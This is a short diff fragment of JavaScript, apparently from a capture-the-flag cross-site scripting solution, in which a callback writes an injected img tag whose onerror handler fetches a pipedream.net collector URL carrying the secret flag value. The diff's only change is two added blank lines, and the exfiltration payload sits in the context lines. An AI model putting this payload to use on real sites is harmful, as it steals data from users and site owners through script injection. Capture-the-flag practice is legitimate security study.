@@ -5,3 +5,5 @@ var callback = function(data){
         flag.document.write(`<img src=x onerror="fetch('https://eoctl0knzoys9l9.m.pipedream.net/?flag=${__flag}')"`)
     }
 }
+
+
